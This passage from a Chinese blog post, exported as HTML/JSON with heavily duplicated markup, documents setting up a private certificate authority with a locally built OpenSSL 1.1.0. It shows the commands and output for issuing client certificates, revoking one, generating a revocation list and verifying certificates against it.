CA/serial\n03\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/crlnumber\n02\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/index.txt\nR\t190601065817Z\t160904073448Z\t01\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c01\nV\t190601073145Z\t\t02\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c02\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/index.txt.old\nV\t190601065817Z\t\t01\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c01\nV\t190601073145Z\t\t02\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c02\n</pre>\n<p>5.验证吊销的证书和正常使用的证书</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl  verify -crl_check -CRLfile CA/all.crl -CAfile CA/cacert.pem CA/client/c01.crt\nC = CN, ST = BJ, O = key1088.info, CN = c01\nerror 23 at 0 depth lookup: certificate revoked\nerror CA/client/c01.crt: verification failed\n</pre>\n<p>再新生成一个02的证书验证一下，验证结果。<br>key1088@key1088-host:~&#x2F;openssl-1.1.0$ .&#x2F;apps&#x2F;openssl  verify -crl_check -CRLfile CA&#x2F;all.crl -CAfile CA&#x2F;cacert.pem CA&#x2F;client&#x2F;c02.crt<br>CA&#x2F;client&#x2F;c02.crt: OK<br>参考文章：<br><a href=\"http://www.yunweipai.com/archives/4513.html%20r\">http://www.yunweipai.com/archives/4513.html%20r</a><br><a href=\"http://raymii.org/s/articles/OpenSSL_manually_verify_a_certificate_against_a_CRL.html\">http://raymii.org/s/articles/OpenSSL_manually_verify_a_certificate_against_a_CRL.html</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"现在越来越多的项目在设计的过程中会很注重网络安全，银行金融业和监管机构之间一般采用金融城域网专线连接，在链路上面也使用CA数字证书，一般金融业的CA证书都是CFCA颁发，或者使用制定型号的-加密机。本章主要介绍一下CA服务器的搭建、证书的申请和吊销（也可以自己做加密机），后续有时间会写一下关于程序中怎么使用CA证书进行安全校验的。openssl安装：先来介绍一下openssl的安装，一般LINUX发行版都会自带openssl工具，裁剪系统中一般自己来编译安装。我们的编译和测试环境如下：key1088-key1088-host-uname-aLinux-key1088-host-4-4-0-36-generic-55-Ubuntu-SMP-Thu-Aug-11-18-01-55-UTC-2016-x86-64-x86-64-x86-64-GNU-Linuxkey1088-key1088-host-gcc-versiongcc-Ubuntu-5-4-0-6ubuntu116-04-2-5-4-0-20160609Copyright-C-2015-Free-Software-Foundation-Inc-This-is-free-software-see-the-source-for-copying-conditions-There-is-NOwarranty-not-even-for-MERCHANTABILITY-or-FITNESS-FOR-A-PARTICULAR-PURPOSE-1-下载openssl源代码https-www-openssl-org-wget-https-www-openssl-org-source-openssl-1-1-0-tar-gz2-编译安装tar-xvf-openssl-1-1-0-tar-gzcd-openssl-1-1-0-configmake咱们这次就不make-install了，就在这个目录下面操作了，需要临时设置一下环境变量这个版本默认编译出来静态bin文件在apps下面-rw-rw-r-1-key1088-key1088-911-9月-4-13-49-x509-d-rwxrwxr-x-1-key1088-key1088-680616-9月-4-13-49-openssl-rwxrwxr-x-1-key1088-key1088-6755-9月-4-13-50-CA-pl-rwxrwxr-x-1-key1088-key1088-6613-9月-4-13-50-tsget3-环境变量设置key1088-key1088-host-openssl-1-1-0-apps-openssl-version-openssl-error-while-loading-shared-libraries-libssl-so-1-1-cannot-open-shared-object-file-No-such-file-or-directorykey1088-key1088-host-openssl-1-1-0-apps-LD-LIBRARY-PATH-LD-LIBRARY-PATH-HOME-openssl-1-1-0key1088-key1088-host-openssl-1-1-0-apps-export-LD-LIBRARY-PATHkey1088-key1088-host-openssl-1-1-0-apps-openssl-versionOpenSSL-1-1-0-25-Aug-2016出现版本号就证明环境变量设置正确，openssl可以用了。CA服务器证书生成：CA（Certificate-Authority）证书颁发机构主要负责证书的颁发、管理以及归档和吊销。证书内包含了拥有证书者的姓名、地址、电子邮件帐号、公钥、证书有效期、发放证书的CA、CA的数字签名等信息。证书主要有三大功能：加密、签名、身份验证。所有的操作默认在openssl-1-1-0目录下进行2-生成CA密钥mkdir-p-CA-privatekey1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-private-cakey-pem-2048-Generating-RSA-private-key-2048-bit-long-modulus-unable-to-write-random-state-e-is-65537-0x010001-如果出现这个“unable-to-write-‘random-state’”设置一下环境变量即可key1088-key1088-host-openssl-1-1-0-export-RANDFILE-HOME-rndkey1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-private-cakey-pem-2048-Generating-RSA-private-key-2048-bit-long-modulus-e-is-65537-0x010001-2-生成自签名证书创建配置文件目录mkdir-etccp-apps-openssl-cnf-etc为了简化证书制作过程中的输入-修改了etc-x2F-openssl-cnf，修改对比内容如下key1088-key1088-host-openssl-1-1-0-diff-etc-openssl-cnf-apps-openssl-cnf42c42-dir-CA-Where-everything-is-kept\"><a href=\"#现在越来越多的项目在设计的过程中会很注重网络安全，银行金融业和监管机构之间一般采用金融城域网专线连接，在链路上面也使用CA数字证书，一般金融业的CA证书都是CFCA颁发，或者使用制定型号的-加密机。本章主要介绍一下CA服务器的搭建、证书的申请和吊销（也可以自己做加密机），后续有时间会写一下关于程序中怎么使用CA证书进行安全校验的。openssl安装：先来介绍一下openssl的安装，一般LINUX发行版都会自带openssl工具，裁剪系统中一般自己来编译安装。我们的编译和测试环境如下：key1088-key1088-host-uname-aLinux-key1088-host-4-4-0-36-generic-55-Ubuntu-SMP-Thu-Aug-11-18-01-55-UTC-2016-x86-64-x86-64-x86-64-GNU-Linuxkey1088-key1088-host-gcc-versiongcc-Ubuntu-5-4-0-6ubuntu116-04-2-5-4-0-20160609Copyright-C-2015-Free-Software-Foundation-Inc-This-is-free-software-see-the-source-for-copying-conditions-There-is-NOwarranty-not-even-for-MERCHANTABILITY-or-FITNESS-FOR-A-PARTICULAR-PURPOSE-1-下载openssl源代码https-www-openssl-org-wget-https-www-openssl-org-source-openssl-1-1-0-tar-gz2-编译安装tar-xvf-openssl-1-1-0-tar-gzcd-openssl-1-1-0-configmake咱们这次就不make-install了，就在这个目录下面操作了，需要临时设置一下环境变量这个版本默认编译出来静态bin文件在apps下面-rw-rw-r-1-key1088-key1088-911-9月-4-13-49-x509-d-rwxrwxr-x-1-key1088-key1088-680616-9月-4-13-49-openssl-rwxrwxr-x-1-key1088-key1088-6755-9月-4-13-50-CA-pl-rwxrwxr-x-1-key1088-key1088-6613-9月-4-13-50-tsget3-环境变量设置key1088-key1088-host-openssl-1-1-0-apps-openssl-version-openssl-error-while-loading-shared-libraries-libssl-so-1-1-cannot-open-shared-object-file-No-such-file-or-directorykey1088-key1088-host-openssl-1-1-0-apps-LD-LIBRARY-PATH-LD-LIBRARY-PATH-HOME-openssl-1-1-0key1088-key1088-host-openssl-1-1-0-apps-export-LD-LIBRARY-PATHkey1088-key1088-host-openssl-1-1-0-apps-openssl-versionOpenSSL-1-1-0-25-Aug-2016出现版本号就证明环境变量设置正确，openssl可以用了。CA服务器证书生成：CA（Certificate-Authority）证书颁发机构主要负责证书的颁发、管理以及归档和吊销。证书内包含了拥有证书者的姓名、地址、电子邮件帐号、公钥、证书有效期、发放证书的CA、CA的数字签名等信息。证书主要有三大功能：加密、签名、身份验证。所有的操作默认在openssl-1-1-0目录下进行2-生成CA密钥mkdir-p-CA-privatekey1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-private-cakey-pem-2048-Generating-RSA-private-key-2048-bit-long-modulus-unable-to-write-random-state-e-is-65537-0x010001-如果出现这个“unable-to-write-‘random-state’”设置一下环境变量即可key1088-key1088-host-openssl-1-1-0-export-RANDFILE-HOME-rndkey1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-private-cakey-pem-2048-Generating-RSA-private-key-2048-bit-long-modulus-e-is-65537-0x010001-2-生成自签名证书创建配置文件目录mkdir-etccp-apps-openssl-cnf-etc为了简化证书制作过程中的输入-修改了etc-x2F-openssl-cnf，修改对比内容如下key1088-key1088-host-openssl-1-1-0-diff-etc-openssl-cnf-apps-openssl-cnf42c42-dir-CA-Where-everything-is-kept\" class=\"headerlink\" title=\"现在越来越多的项目在设计的过程中会很注重网络安全，银行金融业和监管机构之间一般采用金融城域网专线连接，在链路上面也使用CA数字证书，一般金融业的CA证书都是CFCA颁发，或者使用制定型号的 加密机。本章主要介绍一下CA服务器的搭建、证书的申请和吊销（也可以自己做加密机），后续有时间会写一下关于程序中怎么使用CA证书进行安全校验的。openssl安装：先来介绍一下openssl的安装，一般LINUX发行版都会自带openssl工具，裁剪系统中一般自己来编译安装。我们的编译和测试环境如下：key1088@key1088-host:$ uname -aLinux key1088-host 4.4.0-36-generic #55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linuxkey1088@key1088-host:$ gcc --versiongcc (Ubuntu 5.4.0-6ubuntu116.04.2) 5.4.0 20160609Copyright (C) 2015 Free Software Foundation, Inc.This is free software; see the source for copying conditions.  There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.1.下载openssl源代码https://www.openssl.org/wget https://www.openssl.org/source/openssl-1.1.0.tar.gz2.编译安装tar xvf openssl-1.1.0.tar.gzcd openssl-1.1.0./configmake咱们这次就不make install了，就在这个目录下面操作了，需要临时设置一下环境变量这个版本默认编译出来静态bin文件在apps下面-rw-rw-r-- 1 key1088 key1088    911 9月   4 13:49 x509.d-rwxrwxr-x 1 key1088 key1088 680616 9月   4 13:49 openssl-rwxrwxr-x 1 key1088 key1088   6755 9月   4 13:50 CA.pl-rwxrwxr-x 1 key1088 key1088   6613 9月   4 13:50 tsget3.环境变量设置key1088@key1088-host:/openssl-1.1.0/apps$ ./openssl version./openssl: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directorykey1088@key1088-host:/openssl-1.1.0/apps$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$HOME/openssl-1.1.0key1088@key1088-host:/openssl-1.1.0/apps$ export LD_LIBRARY_PATHkey1088@key1088-host:/openssl-1.1.0/apps$ ./openssl versionOpenSSL 1.1.0  25 Aug 2016出现版本号就证明环境变量设置正确，openssl可以用了。CA服务器证书生成：CA（Certificate Authority）证书颁发机构主要负责证书的颁发、管理以及归档和吊销。证书内包含了拥有证书者的姓名、地址、电子邮件帐号、公钥、证书有效期、发放证书的CA、CA的数字签名等信息。证书主要有三大功能：加密、签名、身份验证。所有的操作默认在openssl-1.1.0目录下进行2.生成CA密钥mkdir -p CA/privatekey1088@key1088-host:/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)Generating RSA private key, 2048 bit long modulus.................................+++..........+++unable to write 'random state'e is 65537 (0x010001)如果出现这个“unable to write ‘random state’”设置一下环境变量即可key1088@key1088-host:/openssl-1.1.0$ export RANDFILE=$HOME/.rndkey1088@key1088-host:/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)Generating RSA private key, 2048 bit long modulus.................................+++.....................................................................................+++e is 65537 (0x010001)2.生成自签名证书创建配置文件目录mkdir etccp apps/openssl.cnf etc为了简化证书制作过程中的输入 修改了etc&#x2F;openssl.cnf，修改对比内容如下key1088@key1088-host:~/openssl-1.1.0$ diff etc/openssl.cnf apps/openssl.cnf42c42< dir\t\t= ./CA\t\t# Where everything is kept\"></a>现在越来越多的项目在设计的过程中会很注重网络安全，银行金融业和监管机构之间一般采用金融城域网专线连接，在链路上面也使用CA数字证书，一般金融业的CA证书都是CFCA颁发，或者使用制定型号的 加密机。本章主要介绍一下CA服务器的搭建、证书的申请和吊销（也可以自己做加密机），后续有时间会写一下关于程序中怎么使用CA证书进行安全校验的。<br><strong>openssl安装：<br></strong><br>先来介绍一下openssl的安装，一般LINUX发行版都会自带openssl工具，裁剪系统中一般自己来编译安装。<br>我们的编译和测试环境如下：<br><pre><br>key1088@key1088-host:<del>$ uname -a<br>Linux key1088-host 4.4.0-36-generic #55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux<br>key1088@key1088-host:</del>$ gcc --version<br>gcc (Ubuntu 5.4.0-6ubuntu1<del>16.04.2) 5.4.0 20160609<br>Copyright (C) 2015 Free Software Foundation, Inc.<br>This is free software; see the source for copying conditions.  There is NO<br>warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br></pre><br>1.下载openssl源代码<br><a href=\"https://www.openssl.org/\">https://www.openssl.org/</a><br><pre><br>wget <a href=\"https://www.openssl.org/source/openssl-1.1.0.tar.gz\">https://www.openssl.org/source/openssl-1.1.0.tar.gz</a><br></pre><br>2.编译安装<br><pre><br>tar xvf openssl-1.1.0.tar.gz<br>cd openssl-1.1.0<br>./config<br>make<br></pre><br>咱们这次就不make install了，就在这个目录下面操作了，需要临时设置一下环境变量<br>这个版本默认编译出来静态bin文件在apps下面<br><pre><br>-rw-rw-r-- 1 key1088 key1088    911 9月   4 13:49 x509.d<br>-rwxrwxr-x 1 key1088 key1088 680616 9月   4 13:49 openssl<br>-rwxrwxr-x 1 key1088 key1088   6755 9月   4 13:50 CA.pl<br>-rwxrwxr-x 1 key1088 key1088   6613 9月   4 13:50 tsget<br></pre><br>3.环境变量设置<br><pre><br>key1088@key1088-host:</del>/openssl-1.1.0/apps$ ./openssl version<br>./openssl: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory<br>key1088@key1088-host:<del>/openssl-1.1.0/apps$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$HOME/openssl-1.1.0<br>key1088@key1088-host:</del>/openssl-1.1.0/apps$ export LD_LIBRARY_PATH<br>key1088@key1088-host:<del>/openssl-1.1.0/apps$ ./openssl versionOpenSSL 1.1.0  25 Aug 2016<br></pre><br>出现版本号就证明环境变量设置正确，openssl可以用了。<br><strong><br>CA服务器证书生成：<br></strong><br>CA（Certificate Authority）证书颁发机构主要负责证书的颁发、管理以及归档和吊销。证书内包含了拥有证书者的姓名、地址、电子邮件帐号、公钥、证书有效期、发放证书的CA、CA的数字签名等信息。证书主要有三大功能：加密、签名、身份验证。<br>所有的操作默认在openssl-1.1.0目录下进行<br>2.生成CA密钥<br><pre><br>mkdir -p CA/private<br>key1088@key1088-host:</del>/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)<br>Generating RSA private key, 2048 bit long modulus<br>.................................+++<br>..........+++<br>unable to write 'random state'<br>e is 65537 (0x010001)<br></pre><br>如果出现这个“unable to write ‘random state’”设置一下环境变量即可<br><pre><br>key1088@key1088-host:<del>/openssl-1.1.0$ export RANDFILE=$HOME/.rnd<br>key1088@key1088-host:</del>/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)<br>Generating RSA private key, 2048 bit long modulus<br>.................................+++<br>.....................................................................................+++<br>e is 65537 (0x010001)<br></pre><br>2.生成自签名证书<br>创建配置文件目录<br><pre><br>mkdir etc<br>cp apps/openssl.cnf etc<br></pre><br>为了简化证书制作过程中的输入 修改了etc&#x2F;openssl.cnf，修改对比内容如下<br><pre><br>key1088@key1088-host:~/openssl-1.1.0$ diff etc/openssl.cnf apps/openssl.cnf<br>42c42<br>< dir\t\t= ./CA\t\t# Where everything is kept</h2><blockquote>\n<p>dir\t\t= ./demoCA\t\t# Where everything is kept<br>129c129<br>< countryName_default\t\t= CN</p>\n</blockquote>\n<hr>\n<blockquote>\n<p>countryName_default\t\t= AU<br>134c134<br>< stateOrProvinceName_default\t= BJ</p>\n</blockquote>\n<hr>\n<blockquote>\n<p>stateOrProvinceName_default\t= Some-State<br>139c139<br>< 0.organizationName_default\t= key1088.info</p>\n</blockquote>\n<hr>\n<blockquote>\n<p>0.organizationName_default\t= Internet Widgits Pty Ltd<br>151c151<br>< emailAddress\t\t\t= <a href=\"mailto:&#107;&#101;&#121;&#x31;&#48;&#56;&#56;&#x40;&#x31;&#x36;&#x33;&#46;&#99;&#111;&#109;\">&#107;&#101;&#121;&#x31;&#48;&#56;&#56;&#x40;&#x31;&#x36;&#x33;&#46;&#99;&#111;&#109;</a></p>\n</blockquote>\n<hr>\n<blockquote>\n<p>emailAddress\t\t\t= Email Address<br></pre><br>根据密钥生存证书</p>\n</blockquote>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl req -new -x509 -key CA/private/cakey.pem -out CA/cacert.pem -days 1000 -config etc/openssl.cnf\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [CN]:\nState or Province Name (full name) [BJ]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [key1088.info]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:key1088\nkey1088@163.com []:\n</pre>\n<h2 id=\"创建CA服务器所需文件key1088-key1088-host-openssl-1-1-0-touch-CA-index-txt-serial-key1088-key1088-host-openssl-1-1-0-ls-l-CA-总用量-8-rw-rw-r-1-key1088-key1088-1176-9月-4-14-07-cacert-pem-rw-rw-r-1-key1088-key1088-0-9月-4-14-09-index-txtdrwxrwxr-x-2-key1088-key1088-4096-9月-4-13-57-private-rw-rw-r-1-key1088-key1088-0-9月-4-14-09-serial证书序号开始值设置key1088-key1088-host-openssl-1-1-0-echo-01-CA-serial3-生成客户端证书，也称为节点证书。key1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-client-c01-key-2048-Generating-RSA-private-key-2048-bit-long-modulus-e-is-65537-0x10001-key1088-key1088-host-openssl-1-1-0-apps-openssl-req-new-key-CA-client-c01-key-out-CA-client-c01-csr-config-etc-openssl-cnfYou-are-about-to-be-asked-to-enter-information-that-will-be-incorporatedinto-your-certificate-request-What-you-are-about-to-enter-is-what-is-called-a-Distinguished-Name-or-a-DN-There-are-quite-a-few-fields-but-you-can-leave-some-blankFor-some-fields-there-will-be-a-default-value-If-you-enter-the-field-will-be-left-blank\"><a href=\"#创建CA服务器所需文件key1088-key1088-host-openssl-1-1-0-touch-CA-index-txt-serial-key1088-key1088-host-openssl-1-1-0-ls-l-CA-总用量-8-rw-rw-r-1-key1088-key1088-1176-9月-4-14-07-cacert-pem-rw-rw-r-1-key1088-key1088-0-9月-4-14-09-index-txtdrwxrwxr-x-2-key1088-key1088-4096-9月-4-13-57-private-rw-rw-r-1-key1088-key1088-0-9月-4-14-09-serial证书序号开始值设置key1088-key1088-host-openssl-1-1-0-echo-01-CA-serial3-生成客户端证书，也称为节点证书。key1088-key1088-host-openssl-1-1-0-umask-077-apps-openssl-genrsa-out-CA-client-c01-key-2048-Generating-RSA-private-key-2048-bit-long-modulus-e-is-65537-0x10001-key1088-key1088-host-openssl-1-1-0-apps-openssl-req-new-key-CA-client-c01-key-out-CA-client-c01-csr-config-etc-openssl-cnfYou-are-about-to-be-asked-to-enter-information-that-will-be-incorporatedinto-your-certificate-request-What-you-are-about-to-enter-is-what-is-called-a-Distinguished-Name-or-a-DN-There-are-quite-a-few-fields-but-you-can-leave-some-blankFor-some-fields-there-will-be-a-default-value-If-you-enter-the-field-will-be-left-blank\" class=\"headerlink\" title=\"创建CA服务器所需文件key1088@key1088-host:/openssl-1.1.0$ touch CA/{index.txt,serial}key1088@key1088-host:/openssl-1.1.0$ ls -l CA/总用量 8-rw-rw-r-- 1 key1088 key1088 1176 9月   4 14:07 cacert.pem-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 index.txtdrwxrwxr-x 2 key1088 key1088 4096 9月   4 13:57 private-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 serial证书序号开始值设置key1088@key1088-host:/openssl-1.1.0$ echo \"01\" > CA/serial3.生成客户端证书，也称为节点证书。key1088@key1088-host:/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/client/c01.key 2048)Generating RSA private key, 2048 bit long modulus............+++................................................................................................+++e is 65537 (0x10001)key1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl req -new -key CA/client/c01.key -out CA/client/c01.csr -config etc/openssl.cnfYou are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter '.', the field will be left blank.\"></a>创建CA服务器所需文件<br><pre><br>key1088@key1088-host:<del>/openssl-1.1.0$ touch CA/{index.txt,serial}<br>key1088@key1088-host:</del>/openssl-1.1.0$ ls -l CA/<br>总用量 8<br>-rw-rw-r-- 1 key1088 key1088 1176 9月   4 14:07 cacert.pem<br>-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 index.txt<br>drwxrwxr-x 2 key1088 key1088 4096 9月   4 13:57 private<br>-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 serial<br></pre><br>证书序号开始值设置<br><pre><br>key1088@key1088-host:<del>/openssl-1.1.0$ echo \"01\" > CA/serial<br></pre><br>3.生成客户端证书，也称为节点证书。<br><pre><br>key1088@key1088-host:</del>/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/client/c01.key 2048)<br>Generating RSA private key, 2048 bit long modulus<br>............+++<br>................................................................................................+++<br>e is 65537 (0x10001)<br>key1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl req -new -key CA/client/c01.key -out CA/client/c01.csr -config etc/openssl.cnf<br>You are about to be asked to enter information that will be incorporated<br>into your certificate request.<br>What you are about to enter is what is called a Distinguished Name or a DN.<br>There are quite a few fields but you can leave some blank<br>For some fields there will be a default value,<br>If you enter '.', the field will be left blank.</h2><p>Country Name (2 letter code) [CN]:<br>State or Province Name (full name) [BJ]:<br>Locality Name (eg, city) []:<br>Organization Name (eg, company) [key1088.info]:<br>Organizational Unit Name (eg, section) []:<br>Common Name (e.g. server FQDN or YOUR name) []:c01\t\t#此处不能和CA中的名称相同<br><a href=\"mailto:&#107;&#x65;&#121;&#49;&#x30;&#56;&#x38;&#x40;&#49;&#x36;&#51;&#46;&#x63;&#111;&#x6d;\">&#107;&#x65;&#121;&#49;&#x30;&#56;&#x38;&#x40;&#49;&#x36;&#51;&#46;&#x63;&#111;&#x6d;</a> []:<br>Please enter the following 'extra' attributes<br>to be sent with your certificate request<br>A challenge password []:1234<br>An optional company name []:1234<br></pre><br>4.部署到CA中</p>\n<pre>\nmkdir -p CA/newcerts\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -in CA/client/c01.csr -out CA/client/c01.crt -days 1000 -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\nCan't open ./CA/index.txt.attr for reading, No such file or directory\n140399448418048:error:02001002:system library:fopen:No such file or directory:crypto/bio/bss_file.c:74:fopen('./CA/index.txt.attr','r')\n140399448418048:error:2006D080:BIO routines:BIO_new_file:no such file:crypto/bio/bss_file.c:77:\nCheck that the request matches the signature\nSignature ok\nCertificate Details:\n        Serial Number: 1 (0x1)\n        Validity\n            Not Before: Sep  4 06:58:17 2016 GMT\n            Not After : Jun  1 06:58:17 2019 GMT\n        Subject:\n            countryName               = CN\n            stateOrProvinceName       = BJ\n            organizationName          = key1088.info\n            commonName                = c01\n        X509v3 extensions:\n            X509v3 Basic Constraints:\n                CA:FALSE\n            Netscape Comment:\n                OpenSSL Generated Certificate\n            X509v3 Subject Key Identifier:\n                AB:F4:CB:4F:13:28:F8:5D:A7:DB:A0:E3:F3:52:86:C1:25:D1:EB:A0\n            X509v3 Authority Key Identifier:\n                keyid:68:82:F2:71:02:9C:92:00:F4:05:72:30:24:97:6B:80:2E:69:AF:EA\nCertificate is to be certified until Jun  1 06:58:17 2019 GMT (1000 days)\nSign the certificate? [y/n]:y\n1 out of 1 certificate requests certified, commit? [y/n]y\nWrite out database with 1 new entries\nData Base Updated\nkey1088@key1088-host:~/openssl-1.1.0$ du -a CA/\n8\tCA/newcerts/01.pem\t\t        #自动生成的PEM文件，按照序号命名\n12\tCA/newcerts\n4\tCA/private/cakey.pem\n8\tCA/private\n4\tCA/serial\n4\tCA/serial.old\n0\tCA/index.txt.old\n4\tCA/cacert.pem\n4\tCA/index.txt\n8\tCA/client/c01.crt\t\t\t#生成的证书\n4\tCA/client/c01.key\n4\tCA/client/c01.csr\n20\tCA/client\n4\tCA/index.txt.attr\n64\tCA/\n</pre>\n<p>openssl自带的样例：<br>openssl-1.1.0&#x2F;apps&#x2F;demoCA&#x2F;下面的内容<br>5.转换给pfx格式（可选）</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl pkcs12 -export -clcerts -in CA/client/c01.crt -inkey CA/client/c01.key -out CA/client/c01.pfx\nEnter Export Password:\t\t\t\t\t#12345678\nVerifying - Enter Export Password:\t\t#同上\n</pre>\n<p>pfx文件包含数字签名证书和私钥，可以进行密钥转移，也可以导入到浏览器中查看。<br>6.验证证书是否正确</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl verify -CAfile CA/cacert.pem  CA/client/c01.crt\nCA/client/c01.crt: OK\n</pre>\n<p><strong>吊销证书<br></strong><br>1.查看客户端证书序号</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl x509 -in CA/client/c01.crt -noout -serial -subject\nserial=01\nsubject=C = CN, ST = BJ, O = key1088.info, CN = c01\n</pre>\n<p>2.吊销证书</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -revoke CA/newcerts/01.pem -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\nRevoking Certificate 01.\nData Base Updated\n</pre>\n<p>3.生成吊销列表</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ echo \"01\" > CA/crlnumber\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -gencrl -out CA/all.crl -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\n</pre>\n<p>4.查看吊销</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl crl -in CA/all.crl -noout -text\nCertificate Revocation List (CRL):\n        Version 2 (0x1)\n    Signature Algorithm: sha256WithRSAEncryption\n        Issuer: /C=CN/ST=BJ/O=key1088.info/CN=key1088\n        Last Update: Sep  4 07:37:17 2016 GMT\n        Next Update: Oct  4 07:37:17 2016 GMT\n        CRL extensions:\n            X509v3 CRL Number:\n                1\nRevoked Certificates:\n    Serial Number: 01\n        Revocation Date: Sep  4 07:34:48 2016 GMT\n    Signature Algorithm: sha256WithRSAEncryption\n         a7:98:6c:8f:77:d2:52:6a:57:eb:27:75:6f:17:eb:3c:30:19:\n         78:bb:4f:77:aa:94:74:28:e5:7a:05:38:8d:03:6c:7c:8f:63:\n         de:a9:fd:d3:ed:77:70:7d:24:9a:b9:da:42:05:9b:d1:73:92:\n         6c:0c:13:88:16:16:d7:e1:4f:6f:62:90:8a:11:b1:c5:b7:80:\n         c8:6c:76:e5:d2:eb:a9:f4:ee:da:85:56:9e:f2:97:02:43:ef:\n         3d:ea:77:af:5b:f1:ed:4b:39:c7:7e:9c:22:62:91:ee:17:30:\n         10:d2:49:82:9a:0d:9c:0c:ad:63:1e:cb:30:33:f0:5f:55:dc:\n         b6:6c:70:61:82:ba:e0:d3:98:96:f3:3d:8b:0c:02:0d:fd:ac:\n         61:e5:24:46:a0:52:94:05:f4:a9:a8:8b:25:40:db:a4:e5:58:\n         4f:bd:37:1d:44:87:f1:3f:f9:06:d5:47:aa:0c:8f:1e:ba:d6:\n         99:ef:f7:77:e0:af:05:a3:08:78:06:0f:e2:6a:a4:cd:ac:1a:\n         45:d3:18:9a:18:25:ee:c3:7b:66:51:77:52:64:5e:4a:81:9e:\n         84:be:16:bc:da:7d:83:7b:49:d1:5a:0f:4f:02:e4:fa:fb:80:\n         53:7f:7f:72:02:17:31:25:c6:6e:cc:1e:4f:7e:9c:f4:ae:d1:\n         85:a2:6a:d6\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/serial\n03\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/crlnumber\n02\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/index.txt\nR\t190601065817Z\t160904073448Z\t01\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c01\nV\t190601073145Z\t\t02\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c02\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/index.txt.old\nV\t190601065817Z\t\t01\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c01\nV\t190601073145Z\t\t02\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c02\n</pre>\n<p>5.验证吊销的证书和正常使用的证书</p>\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl  verify -crl_check -CRLfile CA/all.crl -CAfile CA/cacert.pem CA/client/c01.crt\nC = CN, ST = BJ, O = key1088.info, CN = c01\nerror 23 at 0 depth lookup: certificate revoked\nerror CA/client/c01.crt: verification failed\n</pre>\n<p>再新生成一个02的证书验证一下，验证结果。<br>key1088@key1088-host:~&#x2F;openssl-1.1.0$ .&#x2F;apps&#x2F;openssl  verify -crl_check -CRLfile CA&#x2F;all.crl -CAfile CA&#x2F;cacert.pem CA&#x2F;client&#x2F;c02.crt<br>CA&#x2F;client&#x2F;c02.crt: OK<br>参考文章：<br><a href=\"http://www.yunweipai.com/archives/4513.html%20r\">http://www.yunweipai.com/archives/4513.html%20r</a><br><a 